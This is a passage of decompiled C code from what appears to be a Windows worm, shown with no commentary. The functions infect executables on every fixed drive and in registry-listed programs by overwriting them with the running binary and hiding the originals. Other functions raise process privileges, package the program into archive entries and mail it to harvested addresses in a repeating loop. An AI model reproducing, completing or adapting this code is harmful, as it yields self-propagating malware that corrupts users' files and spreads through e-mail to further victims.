  return a2 + v5;
}

//----- (00404FA3) --------------------------------------------------------
_WORD *__cdecl sub_404FA3(LPCSTR lpFileName)
{
  unsigned int v1; // esi
  _WORD *result; // eax
  _WORD *v3; // edi
  unsigned int v4; // eax
  unsigned int *v5; // esi
  unsigned int v6; // eax
  char v7[16]; // [esp+8h] [ebp-14h] BYREF
  int v8; // [esp+18h] [ebp-4h] BYREF

  sub_40174B(v7);
  v8 = 0;
  v1 = 0;
  result = sub_40174E((int)v7, lpFileName, (int)&v8, 0);
  v3 = result;
  if ( result )
  {
    v4 = sub_404B78((int)result, v8);
    if ( v4 )
    {
      v5 = (unsigned int *)((char *)v3 + v4 + 88);
      if ( *v5 )
      {
        *v5 = 0;
        v6 = sub_404F50(v3, v8);
        *v5 = v6;
      }
      else
      {
        v6 = (unsigned int)lpFileName;
      }
      v1 = v6;
    }
    sub_401808((int)v7);
    return (_WORD *)v1;
  }
  return result;
}

//----- (0040500E) --------------------------------------------------------
int __cdecl sub_40500E(LPCCH lpMultiByteStr)
{
  WCHAR WideCharStr[1024]; // [esp+0h] [ebp-800h] BYREF

  if ( dword_491E88 || !dword_491EA8 )
    return 0;
  MultiByteToWideChar(0, 1u, lpMultiByteStr, -1, WideCharStr, 200);
  return dword_491EA8(0, WideCharStr);
}
// 491E88: using guessed type int dword_491E88;
// 491EA8: using guessed type int (__stdcall *dword_491EA8)(_DWORD, _DWORD);

//----- (00405059) --------------------------------------------------------
__int16 __cdecl sub_405059(unsigned __int8 *a1, int a2)
{
  __int16 v4; // cx
  __int16 v5; // dx
  unsigned __int16 v6; // bx
  unsigned __int16 v7; // ax
  __int16 v8; // cx
  __int16 v9; // dx
  char v10; // cf
  __int16 v11; // t2

  v4 = -1;
  v5 = -1;
  do
  {
    v6 = 0;
    v7 = *a1++;
    LOBYTE(v7) = v4 ^ v7;
    LOBYTE(v8) = HIBYTE(v4);
    HIBYTE(v8) = v5;
    LOBYTE(v9) = HIBYTE(v5);
    HIBYTE(v9) = 8;
    do
    {
      v10 = v6 & 1;
      v6 >>= 1;
      v11 = v10 << 15;
      v10 = v7 & 1;
      v7 = (v7 >> 1) | v11;
      if ( v10 )
      {
        v7 ^= 0x8320u;
        v6 ^= 0xEDB8u;
      }
      --HIBYTE(v9);
    }
    while ( HIBYTE(v9) );
    v4 = v7 ^ v8;
    v5 = v6 ^ v9;
    --a2;
  }
  while ( a2 );
  return ~v4;
}

//----- (004050C1) --------------------------------------------------------
int __cdecl sub_4050C1(LPCSTR lpFileName, LPCVOID lpBuffer, char *Source, int a4)
{
  DWORD v4; // edi
  unsigned __int16 v5; // si
  int v6; // ebx
  __int16 v7; // ax
  CHAR *FileA; // eax
  int v10; // eax
  __int16 Buffer; // [esp+Ch] [ebp-14Ch] BYREF
  unsigned __int8 v12; // [esp+Eh] [ebp-14Ah] BYREF
  __int16 v13; // [esp+Fh] [ebp-149h]
  unsigned __int16 v14; // [esp+11h] [ebp-147h]
  DWORD v15; // [esp+13h] [ebp-145h]
  DWORD v16; // [esp+17h] [ebp-141h]
  char v17; // [esp+1Bh] [ebp-13Dh]
  int v18; // [esp+1Ch] [ebp-13Ch]
  int v19; // [esp+20h] [ebp-138h]
  char v20; // [esp+24h] [ebp-134h]
  char v21; // [esp+25h] [ebp-133h]
  __int16 v22; // [esp+26h] [ebp-132h]
  int v23; // [esp+28h] [ebp-130h]
  char Destination[256]; // [esp+2Ch] [ebp-12Ch] BYREF
  char v25[16]; // [esp+12Ch] [ebp-2Ch] BYREF
  DWORD NumberOfBytesWritten; // [esp+13Ch] [ebp-1Ch] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+140h] [ebp-18h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+144h] [ebp-14h] BYREF
  int v29; // [esp+154h] [ebp-4h]
  CHAR *lpFileNamea; // [esp+160h] [ebp+8h]
  unsigned __int8 *lpBuffera; // [esp+164h] [ebp+Ch]

  v4 = 3;
  sub_40174B(v25);
  v5 = strlen(Source) + 32;
  GetLocalTime(&SystemTime);
  SystemTime.wMonth &= ~1u;
  v6 = 0;
  SystemTime.wMinute -= sub_404687(0) % 0x1Eu;
  if ( SystemTime.wMinute >= 0x3Cu )
    SystemTime.wMinute = 1;
  LOWORD(v29) = (LOBYTE(SystemTime.wSecond) >> 1) & 0x1F | (32 * ((SystemTime.wHour << 6) | SystemTime.wMinute & 0x3F));
  v7 = BYTE2(v29) & 0x1F ^ ((SystemTime.wYear + 68) << 9);
  HIWORD(v29) = ((unsigned __int8)((32 * (SystemTime.wMonth & 0xF)) | v7 & 0x1F) ^ LOBYTE(SystemTime.wDay)) & 0x1F ^ ((32 * (SystemTime.wMonth & 0xF)) | v7 & 0xFE1F);
  if ( a4 )
    v4 = 2;
  SetFileAttributesA(lpFileName, 0x20u);
  FileA = (CHAR *)CreateFileA(lpFileName, 0xC0000000, 3u, 0, v4, 0x20u, 0);
  lpFileNamea = FileA;
  if ( FileA == (CHAR *)-1 )
    return 0;
  SetFilePointer(FileA, 0, 0, 2u);
  lpBuffera = (unsigned __int8 *)sub_40174E((int)v25, (LPCSTR)lpBuffer, (int)&nNumberOfBytesToWrite, 1);
  if ( lpBuffera )
  {
    v12 = 116;
    v13 = 0x8000;
    v14 = v5;
    v15 = nNumberOfBytesToWrite;
    v16 = nNumberOfBytesToWrite;
    v17 = 0;
    LOWORD(v10) = sub_405059(lpBuffera, nNumberOfBytesToWrite);
    v18 = v10;
    v20 = 20;
    v19 = v29;
    v21 = 48;
    v22 = strlen(Source);
    v23 = 0;
    strcpy(Destination, Source);
    Buffer = sub_405059(&v12, v5 - 2);
    if ( a4 )
      WriteFile(lpFileNamea, &unk_40FD88, 0x14u, &NumberOfBytesWritten, 0);
    WriteFile(lpFileNamea, &Buffer, v5, &NumberOfBytesWritten, 0);
    WriteFile(lpFileNamea, lpBuffera, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
    sub_401808((int)v25);
    v6 = 1;
  }
  CloseHandle(lpFileNamea);
  return v6;
}
// 405200: variable 'v10' is possibly undefined
// 4050C1: using guessed type char Destination[256];

//----- (004052B4) --------------------------------------------------------
int sub_4052B4()
{
  int result; // eax
  int v1; // [esp+0h] [ebp-4h] BYREF

  v1 = 0;
  result = 1;
  if ( dword_491EAC )
    return dword_491EAC(&v1, 0);
  return result;
}
// 491EAC: using guessed type int (__stdcall *dword_491EAC)(_DWORD, _DWORD);

//----- (004052D3) --------------------------------------------------------
int __cdecl sub_4052D3(HANDLE ProcessHandle, LPCSTR lpName)
{
  HANDLE CurrentProcess; // eax
  int result; // eax
  struct _TOKEN_PRIVILEGES PreviousState; // [esp+4h] [ebp-660h] BYREF
  struct _TOKEN_PRIVILEGES NewState; // [esp+644h] [ebp-20h] BYREF
  DWORD ReturnLength; // [esp+654h] [ebp-10h] BYREF
  struct _LUID Luid; // [esp+658h] [ebp-Ch] BYREF
  int v8; // [esp+660h] [ebp-4h]

  CurrentProcess = ProcessHandle;
  ReturnLength = 1600;
  v8 = 0;
  if ( !ProcessHandle )
    CurrentProcess = GetCurrentProcess();
  result = OpenProcessToken(CurrentProcess, 0x28u, &ProcessHandle);
  if ( result )
  {
    if ( LookupPrivilegeValueA(0, lpName, &Luid) )
    {
      NewState.Privileges[0].Luid = Luid;
      NewState.PrivilegeCount = 0;
      NewState.Privileges[0].Attributes = 0;
      AdjustTokenPrivileges(ProcessHandle, 0, &NewState, 0x10u, &PreviousState, &ReturnLength);
      if ( !GetLastError() )
      {
        PreviousState.Privileges[0].Attributes |= 2u;
        PreviousState.Privileges[0].Luid = Luid;
        PreviousState.PrivilegeCount = 1;
        AdjustTokenPrivileges(ProcessHandle, 0, &PreviousState, 0x10u, 0, 0);
        if ( !GetLastError() )
          v8 = 1;
      }
    }
    CloseHandle(ProcessHandle);
    return v8;
  }
  return result;
}

//----- (004053AC) --------------------------------------------------------
int sub_4053AC()
{
  DWORD Version; // eax
  char *v1; // eax
  char *v3; // eax
  struct _OSVERSIONINFOA VersionInformation; // [esp+Ch] [ebp-94h] BYREF

  sub_404687(1);
  memset(FileName, 0, sizeof(FileName));
  memset(&FullPath, 0, 0x104u);
  memset(&ApplicationName, 0, 0x104u);
  memset(Destination, 0, sizeof(Destination));
  memset(ServiceName, 0, sizeof(ServiceName));
  sub_403529((int)a4, 7852, byte_40E0D0);
  sub_402642(&dword_491E90);
  Version = GetVersion();
  dword_491E98 = 0;
  dword_491E88 = Version & 0x80000000;
  VersionInformation.dwOSVersionInfoSize = 148;
  GetVersionExA(&VersionInformation);
  if ( VersionInformation.dwMajorVersion == 5 && VersionInformation.dwMinorVersion == 1 )
    dword_491E98 = 1;
  sub_4048CB();
  v1 = (char *)operator new(0x7D000u);
  dword_491970 = v1;
  if ( !v1 )
    return 0;
  memset(v1, 0, 0x7D000u);
  sub_40556C();
  v3 = sub_403434(Name, 1);
  sub_4052D3(0, v3);
  return 1;
}
// 491E88: using guessed type int dword_491E88;
// 491E90: using guessed type int dword_491E90;
// 491E98: using guessed type int dword_491E98;

//----- (004054B3) --------------------------------------------------------
const char *__cdecl sub_4054B3(LPCSTR lpFileName, char *Str)
{
  const char *result; // eax
  const char *v3; // edi
  int v4; // esi
  int v5; // esi
  size_t v6; // ebx
  char *v7; // edi
  char v8[16]; // [esp+4h] [ebp-14h] BYREF
  int v9; // [esp+14h] [ebp-4h] BYREF

  sub_40174B(v8);
  result = (const char *)sub_40174E((int)v8, lpFileName, (int)&v9, 0);
  v3 = result;
  if ( result )
  {
    v4 = 4096;
    if ( (unsigned int)v9 >= 0x1000 )
    {
      v6 = strlen(Str);
      if ( (unsigned int)(v9 - 1000) > 0x1000 )
      {
        while ( strncmp(Str, &v3[v4], v6) )
        {
          if ( ++v4 >= (unsigned int)(v9 - 1000) )
            goto LABEL_9;
        }
        v7 = (char *)&v3[v4 + 20];
        sub_403529((int)v7, 7852, v7 - 4);
        memcpy(v7, Str + 20, 0x1EACu);
        sub_403496((int)(v7 - 4));
        sub_4034CD((int)v7, 7852, v7 - 4);
      }
LABEL_9:
      v5 = 1;
    }
    else
    {
      v5 = 0;
    }
    sub_401808((int)v8);
    return (const char *)v5;
  }
  return result;
}

//----- (0040556C) --------------------------------------------------------
HMODULE sub_40556C()
{
  char *v0; // eax
  HMODULE LibraryA; // ebp
  char *v2; // eax
  char *v3; // eax
  char *v4; // eax
  char *v5; // eax
  HMODULE v6; // ebp
  char *v7; // eax
  HMODULE result; // eax
  HMODULE v9; // ebx
  char *v10; // eax

  v0 = sub_403434(LibFileName, 2);
  LibraryA = LoadLibraryA(v0);
  if ( LibraryA )
  {
    v2 = sub_403434(ProcName, 1);
    dword_491EA0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(LibraryA, v2);
    v3 = sub_403434(ProcName, 4);
    dword_491E9C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(LibraryA, v3);
    v4 = sub_403434(ProcName, 5);
    dword_491EA4 = (int (__stdcall *)(_DWORD))GetProcAddress(LibraryA, v4);
  }
  v5 = sub_403434(LibFileName, 3);
  v6 = LoadLibraryA(v5);
  if ( v6 )
  {
    v7 = sub_403434(ProcName, 3);
    dword_491EA8 = (int (__stdcall *)(_DWORD, _DWORD))GetProcAddress(v6, v7);
  }
  result = LoadLibraryA(asc_40FDA4);
  v9 = result;
  if ( result )
  {
    v10 = sub_403434(asc_40FDA4, 1);
    result = (HMODULE)GetProcAddress(v9, v10);
    dword_491EAC = (int (__stdcall *)(_DWORD, _DWORD))result;
  }
  return result;
}
// 491E9C: using guessed type int (__stdcall *dword_491E9C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 491EA0: using guessed type int (__stdcall *dword_491EA0)(_DWORD, _DWORD, _DWORD, _DWORD);
// 491EA4: using guessed type int (__stdcall *dword_491EA4)(_DWORD);
// 491EA8: using guessed type int (__stdcall *dword_491EA8)(_DWORD, _DWORD);
// 491EAC: using guessed type int (__stdcall *dword_491EAC)(_DWORD, _DWORD);

//----- (00405621) --------------------------------------------------------
int __cdecl sub_405621(LPCSTR lpFileName)
{
  char *v2; // eax
  char Source[260]; // [esp+10h] [ebp-64Ch] BYREF
  char v5[260]; // [esp+114h] [ebp-548h] BYREF
  CHAR Filename[260]; // [esp+218h] [ebp-444h] BYREF
  char v7[260]; // [esp+31Ch] [ebp-340h] BYREF
  CHAR FileName[260]; // [esp+420h] [ebp-23Ch] BYREF
  CHAR NewFileName[260]; // [esp+524h] [ebp-138h] BYREF
  struct _FILETIME CreationTime; // [esp+628h] [ebp-34h] BYREF
  char v11[16]; // [esp+640h] [ebp-1Ch] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+650h] [ebp-Ch] BYREF
  size_t v13; // [esp+654h] [ebp-8h] BYREF
  int v14; // [esp+658h] [ebp-4h]
  LPCSTR lpFileNamea; // [esp+664h] [ebp+8h]
  LPCSTR lpFileNameb; // [esp+664h] [ebp+8h]
  unsigned int *lpFileNamec; // [esp+664h] [ebp+8h]

  sub_40174B(v11);
  nNumberOfBytesToWrite = 0;
  if ( sub_4046F6(lpFileName) || sub_40500E(lpFileName) )
    return 0;
  v14 = sub_403464(aDtljpPornnzpo, 0);
  _splitpath(lpFileName, 0, 0, v5, 0);
  lpFileNamea = 0;
  if ( v14 > 0 )
  {
    do
    {
      v2 = sub_403434(aDtljpPornnzpo, (int)lpFileNamea);
      if ( *v2 )
      {
        if ( sub_403B7D(v5, v2) )
          return 0;
      }
    }
    while ( (int)++lpFileNamea < v14 );
  }
  sub_403D8C(NewFileName);
  GetModuleFileNameA(0, Filename, 0x104u);
  if ( !CopyFileA(Filename, NewFileName, 0) )
    return 0;
  SetFileAttributesA(NewFileName, 0x20u);
  if ( !sub_404CCD(NewFileName, lpFileName, 77824)
    || (lpFileNameb = (LPCSTR)sub_40174E((int)v11, lpFileName, (int)&v13, 0)) == 0 )
  {
LABEL_17:
    sub_403DFA(NewFileName);
    return 0;
  }
  if ( v13 <= 0x13000 )
    goto LABEL_16;
  if ( v13 >= 0x300000 )
    goto LABEL_16;
  _splitpath(lpFileName, FileName, Source, Filename, 0);
  strcat(FileName, Source);
  strcat(FileName, Filename);
  strcat(FileName, asc_40E0AC);
  sub_403624(v7, 3, 3, 4);
  v7[0] = tolower(v7[0]);
  strcat(FileName, v7);
  lpFileNamec = sub_407087((int)lpFileNameb, v13, (int)&nNumberOfBytesToWrite);
  if ( !lpFileNamec )
  {
LABEL_16:
    sub_401808((int)v11);
    goto LABEL_17;
  }
  sub_401808((int)v11);
  sub_403CBB(FileName, lpFileNamec, nNumberOfBytesToWrite);
  SetFileAttributesA(FileName, 0x27u);
  v14 = sub_40402D(lpFileName, &CreationTime);
  SetFileAttributesA(lpFileName, 0x20u);
  CopyFileA(NewFileName, lpFileName, 0);
  sub_403DFA(NewFileName);
  strcpy(aO, FileName);
  sub_4054B3(lpFileName, &String1);
  if ( v14 )
    sub_404075(lpFileName, &CreationTime);
  operator delete(lpFileNamec);
  return 1;
}

//----- (004058B1) --------------------------------------------------------
int __cdecl sub_4058B1(char *FullPath)
{
  int *v1; // esi
  _BYTE *v2; // esi
  int v4; // esi
  CHAR *CommandLineA; // eax
  HANDLE v6; // eax
  char Filename[260]; // [esp+4h] [ebp-324h] BYREF
  char Source[260]; // [esp+108h] [ebp-220h] BYREF
  char Destination[260]; // [esp+20Ch] [ebp-11Ch] BYREF
  char v10[16]; // [esp+310h] [ebp-18h] BYREF
  int v11; // [esp+320h] [ebp-8h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+324h] [ebp-4h] BYREF

  sub_40174B(v10);
  nNumberOfBytesToWrite = 0;
  v1 = (int *)sub_40174E((int)v10, FullPath, (int)&v11, 1);
  if ( !v1 )
    return 0;
  _splitpath(FullPath, Destination, Source, Filename, 0);
  strcat(Destination, Source);
  strcat(Destination, Filename);
  strcat(Destination, &byte_40F1D8);
  strcat(Destination, &byte_40F1DC);
  v2 = sub_407196(v1, v11, &nNumberOfBytesToWrite);
  if ( !v2 )
  {
    sub_401808((int)v10);
    return 0;
  }
  sub_401808((int)v10);
  sub_403CBB(Destination, v2, nNumberOfBytesToWrite);
  operator delete(v2);
  v4 = 0;
  CommandLineA = GetCommandLineA();
  v6 = sub_4046B3(Destination, CommandLineA);
  if ( v6 )
  {
    WaitForSingleObject(v6, 0xFFFFFFFF);
    sub_403DFA(Destination);
    return 1;
  }
  return v4;
}

//----- (004059C2) --------------------------------------------------------
int __cdecl sub_4059C2(char *Destination, int a2)
{
  char *v2; // eax
  CHAR FileName[260]; // [esp+0h] [ebp-104h] BYREF

  v2 = sub_403434(SubKey, 5);
  sub_4044C0(HKEY_CURRENT_USER, v2, byte_411940, (LPBYTE)FileName, (HKEY)0x104);
  return sub_404426(FileName, Destination, a2, 1);
}

//----- (00405A0E) --------------------------------------------------------
int __cdecl sub_405A0E(char *FullPath, int a2)
{
  int v2; // edi
  int v3; // edi
  char *v4; // eax
  int v5; // edi
  char *v6; // eax
  char *v7; // eax
  char *v8; // esi
  int v9; // eax
  int v10; // edi
  DWORD v11; // edx
  char Source[260]; // [esp+Ch] [ebp-20Ch] BYREF
  char Destination[260]; // [esp+110h] [ebp-108h] BYREF
  int v15; // [esp+214h] [ebp-4h]
  int i; // [esp+224h] [ebp+Ch]
  int v17; // [esp+224h] [ebp+Ch]

  v15 = 0;
  if ( !a2 )
  {
    v2 = sub_403464(aJvxt, 0);
    Destination[0] = 0;
    _splitpath(FullPath, 0, 0, Destination, Source);
    v3 = v2 - 1;
    for ( i = 0; i < v3; ++i )
    {
      v4 = sub_403434(aJvxt, i);
      if ( !_strcmpi(Destination, v4) && i != v3 )
        v15 = 1;
    }
    strcat(Destination, Source);
    v5 = 0;
    v17 = sub_403464(aVhFzxfp, 0);
    if ( v17 > 0 )
    {
      do
      {
        v6 = sub_403434(aVhFzxfp, v5);
        if ( !_strcmpi(Destination, v6) )
          v15 = 1;
        ++v5;
      }
      while ( v5 < v17 );
    }
    if ( v15 )
    {
      v7 = sub_403434(asc_40FDCC, 1);
      v8 = FullPath;
      if ( !sub_403B7D(FullPath, v7) )
      {
        sub_403DFA(FullPath);
        return 1;
      }
    }
    else
    {
      v8 = FullPath;
    }
    v9 = sub_403C40(v8);
    v10 = v9;
    if ( v9 < 0 )
    {
      if ( v9 == -100 )
        sub_406A68(v8, -1, -1, 0);
    }
    else
    {
      strcpy(&::FullPath, v8);
      if ( v10 < 4 )
      {
        strcpy(FileName, v8);
        sub_404426(v8, dword_491970, 512000, 1);
      }
    }
    v11 = 300 * dword_491EB0;
    if ( 300 * dword_491EB0 > 7000 )
      v11 = 1000 * (sub_404687(0) % 5u + 7);
    Sleep(v11);
    if ( ++dword_491EB0 > 10000 )
      dword_491EB0 = 0;
  }
  return 1;
}
// 491EB0: using guessed type int dword_491EB0;

//----- (00405BBB) --------------------------------------------------------
int __cdecl sub_405BBB(char *FullPath, int a2, int a3)
{
  size_t v3; // eax
  int v4; // eax
  char Filename[260]; // [esp+4h] [ebp-30Ch] BYREF
  char v7[260]; // [esp+108h] [ebp-208h] BYREF
  char Str[260]; // [esp+20Ch] [ebp-104h] BYREF

  _splitpath(FullPath, 0, Str, Filename, 0);
  if ( !a2 )
  {
    if ( a3 )
    {
      v4 = sub_403C01(Filename);
    }
    else
    {
      v3 = strlen(Str);
      if ( v3 )
        v7[v3 + 259] = 0;
      _splitpath(Str, 0, 0, v7, 0);
      v4 = sub_403C01(v7);
    }
    if ( v4 )
      sub_404426(FullPath, dword_491970, 512000, 1);
  }
  return 1;
}

//----- (00405C5A) --------------------------------------------------------
int __cdecl sub_405C5A(char *Source)
{
  int v1; // esi
  int result; // eax

  v1 = 1;
  result = (int)sub_403B7D(Source, &aJfrvot0[1]);
  if ( result )
  {
    if ( sub_403B7D(Source, aJfrvot0) )
      v1 = 0;
    sub_403E11(Source, (int)sub_405BBB, v1);
    return 1;
  }
  return result;
}

//----- (00405C9C) --------------------------------------------------------
int __cdecl sub_405C9C(int a1, char *Source, char *a3, int a4)
{
  int v4; // edi
  char *v5; // eax
  char Destination[1024]; // [esp+Ch] [ebp-B0Ch] BYREF
  CHAR Dst[1024]; // [esp+40Ch] [ebp-70Ch] BYREF
  char Filename[260]; // [esp+80Ch] [ebp-30Ch] BYREF
  char Dir[260]; // [esp+910h] [ebp-208h] BYREF
  CHAR Src[260]; // [esp+A14h] [ebp-104h] BYREF
  int v12; // [esp+B2Ch] [ebp+14h]

  *(_DWORD *)a4 = 0;
  strcpy(Destination, Source);
  strcat(Destination, asc_40E044);
  strcat(Destination, a3);
  sub_4044C0(HKEY_LOCAL_MACHINE, Destination, 0, (LPBYTE)Dst, (HKEY)0x400);
  strcpy(Src, Dst);
  ExpandEnvironmentStringsA(Src, Dst, 0x104u);
  v12 = sub_403464(aJvxt, 0);
  _splitpath(Dst, 0, 0, Filename, 0);
  v4 = 0;
  if ( v12 <= 0 )
    goto LABEL_11;
  do
  {
    v5 = sub_403434(aJvxt, v4);
    if ( *v5 && sub_403B7D(Filename, v5) )
      break;
    ++v4;
  }
  while ( v4 < v12 );
  if ( v4 >= v12 )
  {
LABEL_11:
    if ( sub_403B7D(Dst, aT0) )
      sub_405621(Dst);
  }
  _splitpath(Dst, Src, Dir, 0, 0);
  strcat(Src, Dir);
  sub_405C5A(Src);
  Sleep(0x3E8u);
  return 1;
}

//----- (00405DFA) --------------------------------------------------------
void __stdcall __noreturn sub_405DFA(LPVOID lpThreadParameter)
{
  char Destination[260]; // [esp+0h] [ebp-108h] BYREF
  int v2; // [esp+104h] [ebp-4h] BYREF

  while ( 1 )
  {
    Destination[0] = 0;
    sub_403BD8(Destination, 1);
    sub_404562(HKEY_LOCAL_MACHINE, Destination, (int)sub_405C9C, (int)&v2);
    Sleep(0x36EE80u);
  }
}

//----- (00405E42) --------------------------------------------------------
BOOL __cdecl sub_405E42(char *Source, int a2, int a3)
{
  int v3; // eax

  if ( a2 )
  {
    return !sub_405C5A(Source) && a3 == 0;
  }
  else
  {
    if ( !a3 )
      Sleep(5u);
    v3 = sub_403C40(Source);
    if ( v3 >= 0 && v3 < 3 )
      strcpy(FileName, Source);
    return 1;
  }
}

//----- (00405E9A) --------------------------------------------------------
int __stdcall sub_405E9A(int a1)
{
  char *v1; // eax
  char v2; // bl
  char v3; // al
  UINT DriveTypeA; // eax
  CHAR RootPathName[2]; // [esp+4h] [ebp-10Ch] BYREF
  char v7; // [esp+6h] [ebp-10Ah]
  int v8; // [esp+108h] [ebp-8h]
  char v9; // [esp+10Fh] [ebp-1h]

  RootPathName[0] = 0;
  v1 = sub_403434(aJfrvot0, 1);
  sub_4044C0(HKEY_LOCAL_MACHINE, SubKey, v1, (LPBYTE)RootPathName, (HKEY)0x104);
  sub_405C5A(RootPathName);
  v2 = v7;
  v3 = tolower(RootPathName[0]);
  v8 = 0;
  v9 = v3;
  do
  {
    if ( (_BYTE)v8 + 97 != v9 )
    {
      v7 = 0;
      RootPathName[0] = v8 + 97;
      DriveTypeA = GetDriveTypeA(RootPathName);
      v7 = v2;
      if ( DriveTypeA == 3 )
        sub_403E11(RootPathName, (int)sub_405E42, a1);
    }
    ++v8;
  }
  while ( v8 < 26 );
  return 0;
}

//----- (00405F54) --------------------------------------------------------
int __cdecl sub_405F54(char *Str, char *Destination)
{
  signed int v2; // eax
  signed int i; // ecx

  strcpy(Destination, a2);
  v2 = strlen(Str);
  for ( i = 0; i < v2; ++i )
  {
    if ( Str[i] == 64 )
      break;
  }
  if ( i >= v2 - 1 )
    return 0;
  strcat(Destination, &Str[i + 1]);
  return 1;
}

//----- (00405F9F) --------------------------------------------------------
BOOL __cdecl sub_405F9F(char *a1, char *Str, int a3)
{
  int v4; // eax
  int v5; // esi
  char Destination[260]; // [esp+4h] [ebp-318h] BYREF
  char v7[432]; // [esp+108h] [ebp-214h] BYREF
  char Source[100]; // [esp+2B8h] [ebp-64h] BYREF

  if ( !sub_405F54(a1, Destination) )
    return 0;
  if ( a3 )
  {
    sub_401841(a1);
    sub_4022DB(a1, Str);
  }
  sub_402BF1(v7, Destination, 25, 0x100u, 100);
  sub_403624(Source, 3, 10, 4);
  sub_403075(v7, Source);
  sub_403133(v7, a1 + 100);
  sub_40308A((int)v7, a1);
  if ( sub_402D28((int)v7) )
  {
    sub_402CC3((int)v7);
    return 0;
  }
  v4 = strlen(Str);
  v5 = sub_402D84((int)v7, Str, v4);
  sub_402CC3((int)v7);
  return v5 == 0;
}

//----- (00406083) --------------------------------------------------------
DWORD __stdcall sub_406083(LPVOID lpThreadParameter)
{
  unsigned int v2; // eax
  char *v3; // eax
  bool v4; // zf
  int v5; // edx
  char *v6; // edi
  int v7; // eax
  int v8; // esi
  char *v9; // eax
  unsigned int v10; // eax
  char *v11; // eax
  char Str[7872]; // [esp+Ch] [ebp-2C60h] BYREF
  char v13[300]; // [esp+1ECCh] [ebp-DA0h] BYREF
  CHAR Filename[260]; // [esp+1FF8h] [ebp-C74h] BYREF
  char v15[2340]; // [esp+20FCh] [ebp-B70h] BYREF
  char v16[300]; // [esp+2A20h] [ebp-24Ch] BYREF
  CHAR NewFileName[260]; // [esp+2B4Ch] [ebp-120h] BYREF
  char *Source; // [esp+2C50h] [ebp-1Ch]
  char *v19; // [esp+2C54h] [ebp-18h]
  int i; // [esp+2C58h] [ebp-14h]
  int v21; // [esp+2C5Ch] [ebp-10h]
  int v22; // [esp+2C60h] [ebp-Ch]
  unsigned int v23; // [esp+2C64h] [ebp-8h]
  int v24; // [esp+2C68h] [ebp-4h]

  v19 = (char *)operator new(0x100000u);
  if ( v19 )
  {
    while ( !sub_4052B4() )
      Sleep(0xEA60u);
    sub_4059C2(dword_491970, 512000);
    sub_405E9A(1);
    GetModuleFileNameA(0, Filename, 0x104u);
    sub_403D8C(NewFileName);
    v24 = 0;
    while ( 1 )
    {
      while ( !sub_4052B4() )
        Sleep(0xEA60u);
      if ( !sub_403D58(NewFileName) )
      {
        CopyFileA(Filename, NewFileName, 0);
        SetFileAttributesA(NewFileName, 0x20u);
        sub_404E60(NewFileName, 77824);
        v2 = sub_404687(0);
        sub_403F63(NewFileName, v2 % 0x2800 + 78336);
      }
      for ( i = sub_403464(dword_491970, 0); v24 < i; ++v24 )
      {
        memcpy(Str, &String1, sizeof(Str));
        Str[4116] = 0;
        sub_4054B3(NewFileName, Str);
        memset(v15, 0, sizeof(v15));
        v3 = sub_403434(dword_491970, v24);
        v4 = *v3 == 0;
        Source = v3;
        if ( !v4 )
        {
          strcpy(&v15[100], v3);
          v5 = sub_404687(0) % (unsigned int)i;
          if ( v5 == v24 )
            ++v5;
          if ( v5 >= i )
            v5 = 0;
          v6 = sub_403434(dword_491970, v5);
          if ( !*v6 )
            v6 = sub_403434(dword_491970, 0);
          strcpy(&v15[1452], NewFileName);
          strcpy(&v15[200], v6);
          strcpy(v15, v6);
          if ( sub_405F9F(v15, v19, 1) )
          {
            sub_4033AA(a4, v6, 4096, 1);
          }
          else
          {
            v7 = sub_403464(a4, 0);
            v22 = -1;
            v23 = v7;
            v21 = 0;
            do
            {
              memset(v15, 0, sizeof(v15));
              strcpy(&v15[1452], NewFileName);
              strcpy(&v15[200], v6);
              strcpy(&v15[100], Source);
              v8 = sub_404687(0) % v23;
              if ( v8 == v22 )
                ++v8;
              if ( v8 >= (int)v23 )
                v8 = 0;
              v9 = sub_403434(a4, v8);
              strcpy(v15, v9);
              if ( sub_405F9F(v15, v19, 1) )
                break;
              ++v21;
              v22 = v8;
            }
            while ( v21 < 5 );
            if ( v21 >= 5 )
            {
              v23 = sub_403464(asc_40FE08, 0);
              v10 = sub_404687(0);
              v22 = v10 % v23;
              if ( (int)(v10 % v23) >= (int)v23 )
                v22 = 0;
              sub_403AAD((int)v6, (int)v16, v13);
              strcat(v16, Str2);
              v11 = sub_403434(asc_40FE08, v22);
              strcat(v16, v11);
              memset(v15, 0, sizeof(v15));
              strcpy(&v15[1452], NewFileName);
              strcpy(&v15[200], v6);
              strcpy(&v15[100], Source);
              strcpy(v15, v16);
              sub_405F9F(v15, v19, 1);
            }
          }
        }
      }
      Sleep(0x927C0u);
    }
  }
  return 0;
}
// 406083: using guessed type char var_DA0[300];

//----- (0040644E) --------------------------------------------------------
const char *__cdecl sub_40644E(LPCCH lpMultiByteStr, int a2)
{
  const char *result; // eax
  int v3; // eax
  char v4; // al
  char Source[260]; // [esp+8h] [ebp-560h] BYREF
  struct HKEY__ phkResult; // [esp+10Ch] [ebp-45Ch] BYREF
  char v7[260]; // [esp+210h] [ebp-358h] BYREF
  CHAR FileName[260]; // [esp+314h] [ebp-254h] BYREF
  WCHAR v9[52]; // [esp+418h] [ebp-150h] BYREF
  WCHAR WideCharStr[32]; // [esp+480h] [ebp-E8h] BYREF
  WCHAR v11[20]; // [esp+4C0h] [ebp-A8h] BYREF
  CHAR Buffer[32]; // [esp+4E8h] [ebp-80h] BYREF
  CHAR Destination[2]; // [esp+508h] [ebp-60h] BYREF
  char v14[28]; // [esp+50Ah] [ebp-5Eh] BYREF
  __int16 v15; // [esp+526h] [ebp-42h]
  int v16[8]; // [esp+528h] [ebp-40h] BYREF
  DWORD nSize; // [esp+548h] [ebp-20h] BYREF
  CHAR MultiByteStr[4]; // [esp+54Ch] [ebp-1Ch] BYREF
  int v19; // [esp+550h] [ebp-18h]
  __int16 v20; // [esp+554h] [ebp-14h]
  const char *v21; // [esp+558h] [ebp-10h]
  int v22; // [esp+55Ch] [ebp-Ch] BYREF
  const char *v23; // [esp+560h] [ebp-8h]
  int i; // [esp+564h] [ebp-4h]

  strcpy(Destination, "x");
  memset(v14, 0, sizeof(v14));
  v15 = 0;
  strcpy(MultiByteStr, "a:\\");
